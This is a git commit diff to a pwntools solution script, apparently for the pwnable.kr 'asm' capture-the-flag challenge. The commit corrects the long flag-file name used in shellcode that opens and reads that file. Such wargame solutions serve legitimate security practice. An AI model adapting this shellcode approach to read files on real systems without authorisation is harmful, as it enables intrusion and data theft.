02fb8080eeea3b08089134f62598616380c78884
yoav kaplan <70645788+yoavkaplan123@users.noreply.github.com>
2024-06-03 20:25:34 +0300

    fixed file name

--- solution.py
+++ solution.py
@@ -3,7 +3,9 @@ from pwn import *
 
 context.binary = "/home/asm/asm"
 
-file_name_str = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo$length_int = 1000
+file_name_str = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
+
+length_int = 1000
 
 shellcode = asm(
         shellcraft.open(file_name_str) +
